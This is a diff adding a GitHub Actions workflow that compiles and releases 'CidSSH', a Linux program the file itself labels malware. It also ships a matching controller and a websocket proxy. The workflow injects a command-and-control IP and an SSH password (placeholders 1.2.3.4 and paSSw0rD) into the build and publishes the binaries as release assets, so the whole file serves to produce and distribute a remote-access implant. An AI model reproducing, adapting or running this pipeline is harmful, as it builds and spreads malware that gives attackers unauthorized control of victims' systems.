@@ -1,0 +1,110 @@
+name: Build for Linux
+on: 
+    push:
+    pull_request:
+    release:
+      types: # This configuration does not affect the page_build event above
+        - created
+
+jobs:
+    build:
+        #if: github.event_name == 'push' && contains(toJson(github.event.commits), '***NO_CI***') == false && contains(toJson(github.event.commits), '[ci skip]') == false && contains(toJson(github.event.commits), '[skip ci]') == false
+        runs-on: ubuntu-latest
+        steps:
+            - name: Hardcode the C2 IP if you want here
+              run: echo ::set-env name=C2_IP::1.2.3.4
+            - name: Hardcode the C2 SSH password if you want here
+              run: echo ::set-env name=PASSWORD_AUTH::paSSw0rD
+              
+            - uses: actions/checkout@v1
+              with:
+                  submodules: true
+            - name: Build CidSSH
+              uses: docker://alpine:edge
+              with: 
+                  args: sh ./build.sh $PASSWORD_AUTH $C2_IP
+               
+            #- name: Strip symbols from created malware
+            #  run: |
+            #      strip -s build/src/malware/CidSSH
+            #      strip -s build_ws/src/malware/CidSSH
+                  
+            - name: Upload files to artifact
+              uses: actions/upload-artifact@master
+              with:
+                  name: CidSSH_lnx_ssh_x64
+                  path: build/src/malware/CidSSH
+            - uses: actions/upload-artifact@master
+              with:
+                  name: CidSSH_lnx_ws_x64
+                  path: build_ws/src/malware/CidSSH
+            - uses: actions/upload-artifact@master
+              with:
+                  name: Cid_Controller_lnx_x64
+                  path: build_ws/src/controller/Cid-Controller
+            - uses: actions/upload-artifact@master
+              with:
+                  name: Cid_wsproxy_lnx_x64
+                  path: build_ws/src/wsproxyserver/wsproxy
+                  
+            
+    release:
+        runs-on: ubuntu-latest
+        if: github.event_name == 'release'
+        needs: build
+        steps:
+            - name: Download CidSSH ssh version
+              uses: actions/download-artifact@v1
+              with:
+                  name: CidSSH_lnx_ssh_x64
+            - name: Upload ssh arifact to Github release
+              uses: actions/upload-release-asset@v1
+              env:
+                    GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+              with:
+                  upload_url: ${{ github.event.release.upload_url }}
+                  asset_path: CidSSH_lnx_ssh_x64/CidSSH
+                  asset_name: CidSSH_lnx_ssh_x64
+                  asset_content_type: application/octet-stream
+                  
+            - name: Download CidSSH ws version
+              uses: actions/download-artifact@v1
+              with:
+                  name: CidSSH_lnx_ws_x64
+            - name: Upload ws arifact to Github release
+              uses: actions/upload-release-asset@v1
+              env:
+                    GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+              with:
+                  upload_url: ${{ github.event.release.upload_url }}
+                  asset_path: CidSSH_lnx_ws_x64/CidSSH
+                  asset_name: CidSSH_lnx_ws_x64
+                  asset_content_type: application/octet-stream               
+                  
+            - name: Download CidSSH controller
+              uses: actions/download-artifact@v1
+              with:
+                  name: Cid_Controller_lnx_x64
+            - name: Upload ws arifact to Github release
+              uses: actions/upload-release-asset@v1
+              env:
+                    GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+              with:
+                  upload_url: ${{ github.event.release.upload_url }}
+                  asset_path: Cid_Controller_lnx_x64/Cid-Controller
+                  asset_name: Cid-Controller
+                  asset_content_type: application/octet-stream      
+                  
+            - name: Download websocket proxy server
+              uses: actions/download-artifact@v1
+              with:
+                  name: Cid_wsproxy_lnx_x64
+            - name: Upload ws arifact to Github release
+              uses: actions/upload-release-asset@v1
+              env:
+                    GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+              with:
+                  upload_url: ${{ github.event.release.upload_url }}
+                  asset_path: Cid_wsproxy_lnx_x64/wsproxy
+                  asset_name: Cid-wsproxy
+                  asset_content_type: application/octet-stream      
